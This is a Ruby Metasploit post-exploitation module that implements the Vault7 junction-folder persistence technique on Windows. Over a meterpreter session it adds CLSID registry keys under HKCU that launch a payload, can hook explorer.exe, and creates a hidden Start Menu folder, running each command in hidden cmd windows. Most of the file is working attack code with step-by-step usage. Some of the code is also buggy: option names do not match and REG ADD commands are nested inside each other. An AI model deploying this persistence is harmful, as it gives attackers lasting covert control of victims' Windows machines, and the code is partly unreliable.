##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


##
# Exploit Title  : juntion_shell_folders_persistence.rb
# Module Author  : pedr0 Ubuntu [r00t-3xp10it]
# Vuln discover  : vault7 | wikileaks | nsa
# Tested on      : Windows 2008 | Windows 7 | Windows 10
# POC: https://wikileaks.org/ciav7p1/cms/page_13763373.html
#
#
#
# [ DESCRIPTION ]
# Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a
# method in which the user can cause a redirection to another folder, this module will add a registry
# hive in 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our
# payload, then builds a Folder named POC.{GUID} under 'Start Menu\Programs\Accessories' (persistence).
# in DEMO mode it will take the full path to POC folder and payload from user inputs
#
#
# [ MODULE OPTIONS ]
# The session number to run this module on    => set SESSION 3
# The full path of the appl to run or payload => set APPL_PATH C:\\Windows\\System32\\calc.exe
# The full path and name of folder to create  => set FOLDER_PATH C:\\Users\\%username%\\Destop\\POC
# Use explorer.exe to persiste your agent?    => set PERSIST_EXPLORER true
# Delete malicious registry hive/keys?        => set DEL_REGKEY true
#
#
#
# [ PORT MODULE TO METASPLOIT DATABASE ]
# Kali linux   COPY TO: /usr/share/metasploit-framework/modules/post/windows/escalate/juntion_shell_folders_persistence.rb
# Ubuntu linux COPY TO: /opt/metasploit/apps/pro/msf3/modules/post/windows/escalate/juntion_shell_folders_persistence.rb
# Manually Path Search: root@kali:~# locate modules/post/windows/escalate
#
#
# [ LOAD/USE AUXILIARY ]
# meterpreter > background
# msf exploit(handler) > reload_all
# msf exploit(handler) > use post/windows/escalate/juntion_shell_folders_persistence
# msf post(juntion_shell_folders_persistence) > info
# msf post(juntion_shell_folders_persistence) > show options
# msf post(juntion_shell_folders_persistence) > show advanced options
# msf post(juntion_shell_folders_persistence) > set [option(s)]
# msf post(juntion_shell_folders_persistence) > exploit
#
# [ HINT ]
# In some linux distributions postgresql needs to be started and
# metasploit database deleted/rebuild to be abble to load module.
# 1 - service postgresql start
# 2 - msfdb reinit (optional)
# 3 - msfconsole -x 'reload_all'
##



#
# Metasploit Module librarys to load ..
#
require 'rex'
require 'msf/core'
require 'msf/core/post/common'
require 'msf/core/post/windows/priv'
require 'msf/core/post/windows/registry'



#
# Metasploit Class name and mixins ..
#
class MetasploitModule < Msf::Post
      Rank = ExcellentRanking

         include Msf::Post::Common
         include Msf::Post::Windows::Priv
         include Msf::Post::Windows::Error
         include Msf::Post::Windows::Registry



#
# The 'def initialize()' funtion ..
# Building Metasploit/Armitage info GUI/CLI description
#
        def initialize(info={})
                super(update_info(info,
                        'Name'          => 'vault7 junction folders [User-level Persistence]',
                        'Description'   => %q{
                                        Implementation of vault7 junction folders persistence mechanism. A junction folder in Windows is a method in which the user can cause a redirection to another folder, this module will add a registry hive in 'HKCU\software\Classes\CLSID\{GUID}' and use sub-key '\Shell\Manage\Command' to execute our payload, then builds a Folder named Indexing.{GUID} under 'Start Menu\Programs\Accessories' (persistence).
                        },
                        'License'       => UNKNOWN_LICENSE,
                        'Author'        =>
                                [
                                        'Module Author: r00t-3xp10it',  # post-module author
                                        'Vuln discover: vault7 | nsa',  # vulnerability credits
                                        'special thanks: betto(ssa)',   # module debug help
                                ],
 
                        'Version'        => '$Revision: 1.1',
                        'DisclosureDate' => 'jun 1 2018',
                        'Platform'       => 'windows',
                        'Arch'           => 'x86_x64',
                        'Privileged'     => 'false',   # thats no need for privilege escalation..
                        'Targets'        =>
                                [
                                         # Tested againts windows 2008 | windows 7 | Windows 10
                                         [ 'Windows 2008', 'Windows xp', 'windows vista', 'windows 7', 'Windows 10' ]
                                ],
                        'DefaultTarget'  => '4', # default its to run againts windows 7
                        'References'     =>
                                [
                                         [ 'URL', 'https://github.com/r00t-3xp10it/msf-auxiliarys' ],
                                         [ 'URL', 'https://wikileaks.org/ciav7p1/cms/page_13763373.html' ]


                                ],
			'DefaultOptions' =>
				{
                                         'SESSION' => '1',                                       # Default its to run againts session 1
                                         'APPL_PATH' => 'C:\\Windows\\System32\\calc.exe',       # Default appl (payload) to run
                                         'FOLDER_PATH' => 'C:\\Users\\%username%\\Desktop\\POC', # Default folder path (demo)
				},
                        'SessionTypes'   => [ 'meterpreter' ]
 
                ))
 
                register_options(
                        [
                                OptString.new('SESSION', [ true, 'The session number to run this module on']),
                                OptString.new('APPL_PATH', [ true, 'The full path of the appl to run or payload']),
                                OptString.new('FOLDER_PATH', [ true, 'The full path and name of folder to create']),
                        ], self.class)

                register_advanced_options(
                        [
                                OptBool.new('PERSIST_EXPLORER', [ false, 'Use explorer.exe to persiste your agent?' , false]),
                                OptBool.new('DEL_REGKEY', [ false, 'Delete malicious registry hive/keys?' , false])
                        ], self.class) 

        end



def run
  session = client


    #
    # the 'def check()' funtion that rapid7 requires to accept new modules.
    # Guidelines for Accepting Modules and Enhancements:https://goo.gl/OQ6HEE
    #
    # check for proper operating system (windows-not-wine)
    if not oscheck == "Windows_NT"
      print_error("[ ABORT ]: This module only works againts windows systems")
      return nil
    end
    #
    # check for proper operating system (windows 10)
    #
    if not sysinfo['OS'] =~ /Windows 10/
      print_warning("windows 10 version its protected againts this exploit ...")
      print_line("---------------------------------------------------------")
      print_line("Disable 'access controled to folders' in windows defender")
      print_line("If you wish to teste this on windows 10 version distros")
      print_line("---------------------------------------------------------")
      print_line("")
      Rex::sleep(1.5)
    end


  # variable declarations ..
  app_path = datastore['APP_PATH'] # /root/payload.exe
  fol_path = datastore['FOLDER_PATH'] # C:\\Users\<username>\Desktop\POC
  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
  #
  # check for proper config settings enter
  # to prevent 'unset all' from deleting default options ..
  #
  if datastore['APP_PATH'] == 'nil' || datastore['FOLDER_PATH'] == 'nil'
    print_error("Options not configurated correctly ..")
    print_warning("Please set APP_PATH | FOLDER_PATH!")
    return nil
  else
    print_status("Juntion shell folders (vault7 - nsa)!")
    Rex::sleep(1.5)
  end


    #
    # Search in target regedit if hijack hive exists .. 
    #
    print_status("Reading target registry hive keys ..")
    Rex::sleep(1.0)
    if registry_enumkeys("HKCU\\Software\\Classes\\CLSID")
      print_good("Remote registry hive key found!")
      Rex::sleep(1.0)
    else
      # registry hive key not found, aborting module execution ..
      print_warning("Hive key: HKCU\\Software\\Classes\\CLSID")
      print_error("[ABORT]: module cant find the registry hive key needed ..")
      print_error("System does not appear to be vulnerable to the exploit code!")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end

    #
    # check if file exists (APPL_PATH)
    #
    print_status("check if file exists in target ..")
    if session.fs.file.exist?(app_path)
      print_good("file found ..")
    else
      print_error("not found: #{app_path}")
      print_warning("Deploy your payload before using this module")
      print_line("")
      Rex::sleep(1.0)
      return nil
    end


      # store user name into a variable
      print_status("Retriving target username ..")
      Rex::sleep(1.0)
      user_name = cmd_exec("%username%")
      # create new GUID and store it in variable
      print_status("Creating new GUID key value ..")
      Rex::sleep(1.0)
      new_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")


     #
     # List of registry keys to add to target regedit ..
     #
     if datastore['PERSIST_EXPLORER'] == true
       print_status("Persiste in explorer.exe selected ..")
       Rex::sleep(1.0)
       hacks = [
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d #{app_path}" /f',
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v LoadWithoutCOM /t REG_SZ /d" /f',
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\InprocServer32 /v ThreadingModel /t REG_SZ /d Apartment" /f',
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v Attributes /t REG_DWORD /d 0xf090013d" /f',
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\ShellFolder /v HideOnDesktop /t REG_SZ /d" /f',
        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
       ]
     else
       print_status("Demo mode selected ..")
       Rex::sleep(1.0)
       hacks = [
        'REG ADD "REG ADD #{hive_key}\\#{new_GUID}\\Shell\\Manage\\Command /ve /t REG_SZ /d \"#{app_path}\"" /f',
        'RUNDLL32.EXE USER32.DLL,UpdatePerUserSystemParameters ,1 ,True'
       ]
     end


       r=''
       session.response_timeout=120
       hacks.each do |cmd|
          begin
            # execute cmd prompt in a hidden channelized windows
            r = session.sys.process.execute("cmd.exe /R #{cmd}", nil, {'Hidden' => true, 'Channelized' => true})
            print_line("  Hijacking : #{cmd}")
 
               # close client channel when done
               while(d = r.channel.read)
                       break if d == ""
               end
               r.channel.close
               r.close
           end


         #
         # build POC folder (juntion shell folders)  fol_path
         #
         if datastore['PERSIST_EXPLORER'] == true
           r=''
           print_status("Creating juntion shell folder ..")
           Rex::sleep(1.0)
           print_warning("Revert folder path to: %AppData%\\..\\Start Menu\\..")
           Rex::sleep(1.0)
           folder_poc ="mkdir \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
           r = session.sys.process.execute("cmd.exe /R #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
           r.channel.close
           r.close
         else
           r=''
           print_status("Creating #{fol_path}")
           Rex::sleep(1.0)
           r = session.sys.process.execute("cmd.exe /R mkdir #{fol_path}.#{new_GUID}", nil, {'Hidden' => true, 'Channelized' => true})
           r.channel.close
           r.close
         end


       #
       # Clean module sellected (delete GUID reg key)..
       #
       if datastore['DEL_REGKEY'] == true
         r=''
         print_status("Delete registry entry: #{new_GUID}..")
         Rex::sleep(1.0)
         reg_clear = "REG DELETE HKCU\\Software\\Classes\\CLSID\\#{new_GUID} /f"
         r = session.sys.process.execute("cmd.exe /c #{reg_clear}", nil, {'Hidden' => true, 'Channelized' => true})
         print_status("Deleted: #{reg_clear}")
         Rex::sleep(1.0)
           if datastore['PERSIST_EXPLORER'] == true
             print_warning("POC Folder needs to be deleted manually ..")
             Rex::sleep(1.0)
           else
             print_warning("POC Folder needs to be deleted manually ..")
             Rex::sleep(1.0)
           end
         r.channel.close
         r.close
       end


   #
   # end of the 'def run()' funtion (exploit code) ..
   #
   end
#
# exit module execution (_EOF) ..
#
end
